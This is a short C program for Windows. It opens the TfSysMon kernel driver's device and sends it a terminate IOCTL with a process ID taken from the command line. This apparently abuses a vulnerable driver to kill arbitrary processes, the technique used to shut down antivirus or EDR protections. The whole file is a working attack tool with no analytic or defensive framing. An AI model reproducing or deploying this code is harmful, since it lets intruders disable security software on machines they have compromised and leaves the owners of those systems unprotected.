#include <stdio.h>
#include <Windows.h>

#define DRIVER_SYMLINK L"\\\\.\\TfSysMon"
#define TERMINATE_IOCTL 0xB4A00404

typedef struct _killerBuff {
	int useless;
	int PID;
	int sth[4];
} killerBuff, * pKillerBuff;

int main(int argc, char* argv[]) {
	unsigned int PID; // 30896;
	if (argc < 2) {
		printf("Provide a PID\n%s <PID>", argv[0]);
		exit(1);
	}
	else {
		PID = atoi(argv[1]);
		printf("PID to be targetted: %d\n", PID);
	}

	killerBuff buff = { 256,PID };

	HANDLE hDriver = CreateFile(DRIVER_SYMLINK, GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (!hDriver) {
		printf("Could not open handle to the Driver\n");
	}

	DWORD bytesReturned = 0;
	BYTE outBuffer[256];

	BOOL ioctl_result = DeviceIoControl(hDriver, TERMINATE_IOCTL, &buff, sizeof(buff),&outBuffer,256,&bytesReturned, NULL);
	if (ioctl_result) {
		printf("Must've Died\n");
	}
	else {
		printf("Something botched up\n");
	}
}